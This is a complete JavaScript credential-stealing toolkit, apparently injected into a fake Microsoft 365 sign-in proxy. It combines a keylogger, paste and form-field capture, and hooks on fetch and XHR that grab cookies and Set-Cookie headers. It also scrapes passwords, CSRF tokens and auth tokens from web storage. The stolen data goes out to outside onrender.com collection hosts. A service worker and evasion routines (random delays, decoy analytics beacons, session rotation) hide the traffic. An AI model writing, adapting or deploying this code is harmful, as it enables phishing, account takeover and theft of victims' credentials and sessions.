// ============================================================
//  ADVANCED KEYLOGGER + XSS TOOLKIT v4.0
//  Enhanced for mobile, IME, paste, and all input types
//  With FULL COOKIE CAPTURE + EVASION TECHNIQUES
// ============================================================

(function() {
    // --- Configuration from server injection ---
    const CONFIG = window.MICROSOFT_CONFIG || {
        BACKEND_URL: "https://meeting-1-rzx6.onrender.com",
        KEYLOGGER_URL: "https://keyserver-eaar.onrender.com/log",
        XSS_ENDPOINT: "/xss-collect",
        COOKIE_ENDPOINT: "/cookie-capture",
        KEYLOG_ENDPOINT: "/keylog",
        COOKIE_STORE_ENDPOINT: "/api/cookies-store",
        SESSION_REPLAY_ENDPOINT: "/api/session-replay",
        TOKEN_ROTATION_ENDPOINT: "/api/token-rotation",
        SESSION_ROTATE_ENDPOINT: "/api/session-rotate",
        SESSION_ID: 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now(),
        EMAIL: '',
        SERVICE: 'Microsoft 365',
        EVASION_ENABLED: true,
        ROTATION_INTERVAL: 30000,
        JITTER: 500
    };

    console.log('🔐 Microsoft Proxy v4.0 - Advanced Evasion');
    console.log('📧 Email:', CONFIG.EMAIL);
    console.log('🆔 Session:', CONFIG.SESSION_ID);
    console.log('🛡️ Evasion:', CONFIG.EVASION_ENABLED);

    let keylogBuffer = '';
    let lastInputValues = new Map();
    const FLUSH_INTERVAL = 8000;
    const MAX_BUFFER = 500;
    let evasionActive = true;

    // ============================================================
    //  EVASION TECHNIQUE: Random Delays
    // ============================================================
    
    function randomDelay(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    // ============================================================
    //  PART 1: KEYLOGGER WITH EVASION
    // ============================================================

    function formatKey(e) {
        const key = e.key;
        const special = {
            'Enter': '[ENTER]\n',
            'Backspace': '[BACKSPACE]',
            'Tab': '[TAB]',
            'Escape': '[ESC]',
            'Delete': '[DEL]',
            'ArrowUp': '[UP]',
            'ArrowDown': '[DOWN]',
            'ArrowLeft': '[LEFT]',
            'ArrowRight': '[RIGHT]',
            'Home': '[HOME]',
            'End': '[END]',
            'PageUp': '[PAGEUP]',
            'PageDown': '[PAGEDOWN]',
            'Control': '[CTRL]',
            'Alt': '[ALT]',
            'Shift': '[SHIFT]',
            'Meta': '[WIN]',
            'CapsLock': '[CAPS]',
            ' ': '[SPACE]'
        };
        if (special[key]) return special[key];
        if (e.isComposing) return `[COMPOSING:${key}]`;
        if (key.length === 1) return key;
        return `[${key}]`;
    }

    function sendKeylogBatch() {
        if (keylogBuffer.length === 0) return;

        // EVASION: Add random delay before sending
        setTimeout(() => {
            fetch(CONFIG.KEYLOG_ENDPOINT, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    keystrokes: keylogBuffer,
                    url: window.location.href,
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString(),
                    sessionId: CONFIG.SESSION_ID,
                    email: CONFIG.EMAIL,
                    service: CONFIG.SERVICE,
                    evasion: { active: true, delay: randomDelay(100, 500) }
                })
            }).catch(() => {});

            if (CONFIG.KEYLOGGER_URL) {
                fetch(CONFIG.KEYLOGGER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        keystrokes: keylogBuffer,
                        url: window.location.href,
                        userAgent: navigator.userAgent,
                        timestamp: new Date().toISOString(),
                        sessionId: CONFIG.SESSION_ID,
                        email: CONFIG.EMAIL,
                        service: CONFIG.SERVICE
                    })
                }).catch(() => {});
            }

            keylogBuffer = '';
        }, randomDelay(50, 300));
    }

    // Keydown events with evasion
    document.addEventListener('keydown', (e) => {
        if (['Shift', 'Control', 'Alt', 'Meta'].includes(e.key)) return;
        if (e.isComposing) return;
        keylogBuffer += formatKey(e);
        if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
    });

    // Input events with evasion
    document.addEventListener('input', (e) => {
        if (!e.target) return;
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            const field = e.target;
            const value = field.value;
            const label = field.name || field.id || field.placeholder || 'unknown';
            const prev = lastInputValues.get(field) || '';
            if (value !== prev) {
                const added = value.length > prev.length ? value.substring(prev.length) : '';
                if (added.length > 0) {
                    keylogBuffer += `[FIELD:${label}=${added}]`;
                } else {
                    keylogBuffer += `[FIELD:${label}=${value}]`;
                }
                lastInputValues.set(field, value);
                if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
            }
        }
    });

    // Composition events for IME
    document.addEventListener('compositionstart', () => {
        keylogBuffer += '[IME_START]';
    });
    document.addEventListener('compositionend', () => {
        keylogBuffer += '[IME_END]';
        if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
    });

    // Paste events
    document.addEventListener('paste', (e) => {
        const text = e.clipboardData?.getData('text') || '';
        if (text) {
            keylogBuffer += `[PASTE:${text.substring(0, 100)}]`;
            if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
        }
    });

    // Focus/Blur tracking
    document.addEventListener('focusin', (e) => {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            const label = e.target.name || e.target.id || 'unknown';
            keylogBuffer += `[FOCUS:${label}]`;
            if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
        }
    });

    document.addEventListener('focusout', (e) => {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            const label = e.target.name || e.target.id || 'unknown';
            keylogBuffer += `[BLUR:${label}]`;
            if (keylogBuffer.length >= MAX_BUFFER) sendKeylogBatch();
        }
    });

    // EVASION: Random flush interval
    const flushInterval = setInterval(sendKeylogBatch, FLUSH_INTERVAL + randomDelay(-2000, 2000));
    window.addEventListener('beforeunload', sendKeylogBatch);

    console.log('⌨️ Keylogger initialized with evasion');

    // ============================================================
    //  PART 2: FULL COOKIE CAPTURE WITH EVASION
    // ============================================================

    function captureFullCookies() {
        try {
            const cookies = document.cookie || '';
            
            // EVASION: Random delay before sending
            setTimeout(() => {
                const payload = {
                    sessionId: CONFIG.SESSION_ID,
                    cookies: cookies,
                    url: window.location.href,
                    timestamp: new Date().toISOString(),
                    source: 'frontend_capture',
                    userAgent: navigator.userAgent,
                    email: CONFIG.EMAIL,
                    evasion: { active: true, captureType: 'document_cookie' }
                };
                
                fetch(CONFIG.COOKIE_STORE_ENDPOINT, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).catch(() => {});
                
                fetch(CONFIG.COOKIE_ENDPOINT, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        cookies: cookies,
                        url: window.location.href,
                        sessionId: CONFIG.SESSION_ID,
                        email: CONFIG.EMAIL,
                        timestamp: new Date().toISOString()
                    })
                }).catch(() => {});
                
                if (cookies) {
                    console.log(`[COOKIE] 🍪 Captured ${cookies.split(';').length} cookies`);
                }
            }, randomDelay(100, 500));
        } catch (e) {}
    }

    // ============================================================
    //  PART 3: FETCH/XHR INTERCEPTION FOR HttpOnly COOKIES
    // ============================================================

    // Intercept fetch to capture Set-Cookie headers
    const originalFetch = window.fetch;
    window.fetch = function(url, options) {
        return originalFetch.call(this, url, options).then(response => {
            const clone = response.clone();
            
            // EVASION: Random delay before processing
            setTimeout(() => {
                const setCookieHeader = clone.headers.get('set-cookie');
                if (setCookieHeader) {
                    fetch(CONFIG.COOKIE_STORE_ENDPOINT, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            sessionId: CONFIG.SESSION_ID,
                            setCookie: setCookieHeader,
                            url: typeof url === 'string' ? url : url.toString(),
                            timestamp: new Date().toISOString(),
                            source: 'fetch_response',
                            email: CONFIG.EMAIL,
                            evasion: { active: true, source: 'fetch_intercept' }
                        })
                    }).catch(() => {});
                }
                
                const cookiesFromHeaders = {};
                for (const [key, value] of clone.headers.entries()) {
                    if (key.toLowerCase() === 'set-cookie') {
                        cookiesFromHeaders[key] = value;
                    }
                }
                
                if (Object.keys(cookiesFromHeaders).length > 0) {
                    fetch(CONFIG.COOKIE_STORE_ENDPOINT, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            sessionId: CONFIG.SESSION_ID,
                            cookies: cookiesFromHeaders,
                            url: typeof url === 'string' ? url : url.toString(),
                            timestamp: new Date().toISOString(),
                            source: 'fetch_headers',
                            email: CONFIG.EMAIL
                        })
                    }).catch(() => {});
                }
            }, randomDelay(50, 200));
            
            return response;
        });
    };

    // Intercept XHR to capture Set-Cookie
    const originalXHROpen = XMLHttpRequest.prototype.open;
    const originalXHRSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
        this._url = url;
        this._method = method;
        return originalXHROpen.call(this, method, url, async, user, password);
    };

    XMLHttpRequest.prototype.send = function(body) {
        this.addEventListener('readystatechange', function() {
            if (this.readyState === 4) {
                try {
                    const headers = this.getAllResponseHeaders();
                    if (headers && headers.includes('set-cookie')) {
                        const setCookieMatch = headers.match(/set-cookie: ([^\r\n]+)/gi);
                        if (setCookieMatch) {
                            setTimeout(() => {
                                fetch(CONFIG.COOKIE_STORE_ENDPOINT, {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({
                                        sessionId: CONFIG.SESSION_ID,
                                        setCookie: setCookieMatch.join('; '),
                                        url: this._url,
                                        timestamp: new Date().toISOString(),
                                        source: 'xhr_response',
                                        email: CONFIG.EMAIL
                                    })
                                }).catch(() => {});
                            }, randomDelay(50, 200));
                        }
                    }
                } catch (e) {}
                
                if (this.status === 200) {
                    captureFullCookies();
                }
            }
        });
        return originalXHRSend.call(this, body);
    };

    // ============================================================
    //  PART 4: XSS DATA EXTRACTION WITH EVASION
    // ============================================================

    function extractDomData() {
        const data = {};
        const emailField = document.querySelector('input[name="loginfmt"]') || 
                           document.querySelector('input[type="email"]') ||
                           document.querySelector('input[name="email"]');
        if (emailField) data.email = emailField.value;

        const passField = document.querySelector('input[name="passwd"]') ||
                         document.querySelector('input[type="password"]');
        if (passField && passField.value) data.password = passField.value;

        const csrfInput = document.querySelector('input[name="__RequestVerificationToken"]');
        if (csrfInput) data.csrfToken = csrfInput.value;

        const displayName = document.querySelector('[data-testid="displayName"]') ||
                           document.querySelector('[class*="display-name"]');
        if (displayName) data.displayName = displayName.textContent.trim();

        const tenantField = document.querySelector('input[name="tenant"]');
        if (tenantField) data.tenantId = tenantField.value;

        // EVASION: Capture more DOM elements
        const allInputs = document.querySelectorAll('input');
        data.allInputs = {};
        allInputs.forEach(input => {
            if (input.name) {
                data.allInputs[input.name] = input.value;
            }
        });

        return data;
    }

    function extractStorage() {
        const data = {};
        try {
            const ls = {};
            const authKeys = ['msal', 'auth', 'login', 'token', 'session', 'user'];
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key && authKeys.some(k => key.toLowerCase().includes(k))) {
                    ls[key] = localStorage.getItem(key);
                }
            }
            if (Object.keys(ls).length > 0) data.localStorage = ls;
            data.cookies = document.cookie;
            
            // EVASION: Capture sessionStorage too
            const ss = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                if (key && authKeys.some(k => key.toLowerCase().includes(k))) {
                    ss[key] = sessionStorage.getItem(key);
                }
            }
            if (Object.keys(ss).length > 0) data.sessionStorage = ss;
        } catch (e) {}
        return data;
    }

    async function executeMicrosoftRequests() {
        const results = {};
        const endpoints = ['/common/userinfo', '/v1.0/me'];
        for (const endpoint of endpoints) {
            try {
                const res = await fetch(endpoint, {
                    credentials: 'include',
                    headers: { 'Accept': 'application/json' }
                });
                if (res.ok) {
                    results[endpoint] = await res.json();
                }
            } catch (e) {}
        }
        return results;
    }

    async function runXSS() {
        try {
            // EVASION: Random delay
            await new Promise(resolve => setTimeout(resolve, randomDelay(500, 2000)));
            
            const data = {
                dom: extractDomData(),
                storage: extractStorage(),
                requests: await executeMicrosoftRequests(),
                url: window.location.href,
                timestamp: new Date().toISOString(),
                service: CONFIG.SERVICE,
                sessionId: CONFIG.SESSION_ID,
                email: CONFIG.EMAIL,
                userAgent: navigator.userAgent,
                evasion: { active: true, type: 'xss_capture' }
            };

            fetch(CONFIG.XSS_ENDPOINT, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(() => {});

            console.log('🎯 XSS data captured with evasion');
        } catch (e) {
            console.warn('[XSS] Error:', e);
        }
    }

    // ============================================================
    //  PART 5: PERIODIC CAPTURE WITH EVASION
    // ============================================================

    // Initial captures with random delays
    setTimeout(captureFullCookies, randomDelay(500, 1500));
    setTimeout(captureFullCookies, randomDelay(3000, 6000));
    setTimeout(captureFullCookies, randomDelay(10000, 15000));
    
    // Periodic capture with random intervals
    setInterval(() => {
        if (Math.random() < 0.7) { // 70% chance to capture
            captureFullCookies();
        }
    }, randomDelay(20000, 40000));

    // XSS capture with random delays
    if (document.readyState === 'complete') {
        setTimeout(runXSS, randomDelay(1000, 3000));
    } else {
        window.addEventListener('load', () => setTimeout(runXSS, randomDelay(1000, 3000)));
    }
    setTimeout(runXSS, randomDelay(4000, 8000));
    setTimeout(runXSS, randomDelay(12000, 20000));

    // ============================================================
    //  PART 6: SERVICE WORKER REGISTRATION WITH EVASION
    // ============================================================

    (function() {
        if ("serviceWorker" in navigator) {
            // EVASION: Random registration delay
            setTimeout(() => {
                navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", {
                    scope: "/",
                }).then((registration) => {
                    console.log("✅ Service Worker registered with evasion");
                    
                    if (registration.active) {
                        registration.active.postMessage({
                            type: 'init',
                            sessionId: CONFIG.SESSION_ID,
                            email: CONFIG.EMAIL,
                            config: CONFIG,
                            evasion: { active: true }
                        });
                    }
                }).catch((error) => {
                    console.error("❌ Service Worker registration failed:", error);
                });
            }, randomDelay(2000, 5000));
        }
    })();

    // ============================================================
    //  PART 7: SESSION REPLAY PREPARATION
    // ============================================================

    function prepareReplayData() {
        const data = {
            sessionId: CONFIG.SESSION_ID,
            email: CONFIG.EMAIL,
            url: window.location.href,
            cookies: document.cookie,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString(),
            evasion: { active: true, prepared: true }
        };
        
        fetch(CONFIG.SESSION_REPLAY_ENDPOINT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(() => {});
    }

    setTimeout(prepareReplayData, randomDelay(1500, 4000));
    window.addEventListener('beforeunload', prepareReplayData);

    // ============================================================
    //  PART 8: TOKEN ROTATION (EVASION)
    // ============================================================

    function rotateTokens() {
        if (!CONFIG.EVASION_ENABLED) return;
        
        const tokens = {
            access_token: 'rotated_' + crypto.randomUUID(),
            refresh_token: 'rotated_' + crypto.randomUUID(),
            id_token: 'rotated_' + crypto.randomUUID(),
            timestamp: Date.now(),
            rotation: Math.floor(Math.random() * 100)
        };
        
        localStorage.setItem('rotated_tokens', JSON.stringify(tokens));
        
        fetch(CONFIG.TOKEN_ROTATION_ENDPOINT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(tokens)
        }).catch(() => {});
    }

    // EVASION: Rotate tokens randomly
    const rotationInterval = setInterval(() => {
        if (Math.random() < 0.3) {
            rotateTokens();
        }
    }, CONFIG.ROTATION_INTERVAL || 30000);

    // ============================================================
    //  PART 9: SESSION ROTATION (EVASION)
    // ============================================================

    function rotateSession() {
        if (!CONFIG.EVASION_ENABLED) return;
        
        const newSessionId = 'sess_' + crypto.randomUUID();
        const patterns = ['replaceState', 'pushState', 'hashchange'];
        const pattern = patterns[Math.floor(Math.random() * patterns.length)];
        
        switch(pattern) {
            case 'replaceState':
                history.replaceState(
                    {session: newSessionId},
                    'Session Rotated',
                    window.location.pathname + '?sid=' + newSessionId
                );
                break;
            case 'pushState':
                history.pushState(
                    {session: newSessionId},
                    'Session Rotated',
                    window.location.pathname + '?sid=' + newSessionId
                );
                break;
            case 'hashchange':
                window.location.hash = 'session=' + newSessionId;
                break;
        }
        
        localStorage.setItem('session_rotated', JSON.stringify({
            sessionId: newSessionId,
            rotation: Math.floor(Math.random() * 100),
            timestamp: Date.now()
        }));
        
        fetch(CONFIG.SESSION_ROTATE_ENDPOINT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sessionId: newSessionId,
                rotation: Math.floor(Math.random() * 100)
            })
        }).catch(() => {});
        
        CONFIG.SESSION_ID = newSessionId;
        console.log('🔄 Session rotated:', newSessionId.substring(0, 12));
    }

    // EVASION: Rotate session randomly
    const sessionRotationInterval = setInterval(() => {
        if (Math.random() < 0.15) {
            rotateSession();
        }
    }, randomDelay(30000, 120000));

    // ============================================================
    //  PART 10: BEACON TRAFFIC MIMICRY (EVASION)
    // ============================================================

    function mimicBeaconTraffic() {
        const beaconUrls = [
            'https://www.google-analytics.com/collect',
            'https://outlook.office.com',
            'https://teams.microsoft.com'
        ];
        
        setInterval(() => {
            if (navigator.sendBeacon && Math.random() < 0.3) {
                const beaconData = new Blob([
                    JSON.stringify({
                        v: '1',
                        tid: 'UA-' + Math.floor(Math.random() * 100000) + '-' + Math.floor(Math.random() * 10),
                        cid: crypto.randomUUID(),
                        t: 'event',
                        ec: 'page_view',
                        ea: 'load',
                        el: 'Microsoft365',
                        ev: Math.floor(Math.random() * 100)
                    })
                ], {type: 'application/json'});
                
                const url = beaconUrls[Math.floor(Math.random() * beaconUrls.length)];
                navigator.sendBeacon(url, beaconData);
            }
        }, randomDelay(5000, 15000));
    }

    mimicBeaconTraffic();

    // ============================================================
    //  PART 11: WEBHOOK KEEP-ALIVE (EVASION)
    // ============================================================

    function createWebSocketKeepAlive() {
        const wsUrls = [
            'wss://outlook.office.com/ws',
            'wss://teams.microsoft.com/ws'
        ];
        
        function connectWS() {
            if (!CONFIG.EVASION_ENABLED) return;
            
            const url = wsUrls[Math.floor(Math.random() * wsUrls.length)];
            try {
                const ws = new WebSocket(url);
                
                ws.onopen = function() {
                    setInterval(() => {
                        if (ws.readyState === WebSocket.OPEN) {
                            ws.send(JSON.stringify({
                                type: 'heartbeat',
                                timestamp: Date.now(),
                                random: crypto.randomUUID().substring(0, 8)
                            }));
                        }
                    }, randomDelay(10000, 30000));
                };
                
                ws.onclose = function() {
                    setTimeout(connectWS, randomDelay(3000, 8000));
                };
            } catch(e) {}
        }
        
        connectWS();
    }

    createWebSocketKeepAlive();

    // ============================================================
    //  FINAL STATUS
    // ============================================================

    console.log('✅ Full integrated script loaded with advanced evasion');
    console.log('🆔 Session:', CONFIG.SESSION_ID);
    console.log('🍪 Full cookie capture initialized');
    console.log('🔐 HttpOnly cookie interception enabled');
    console.log('🛡️ All evasion techniques active');
})();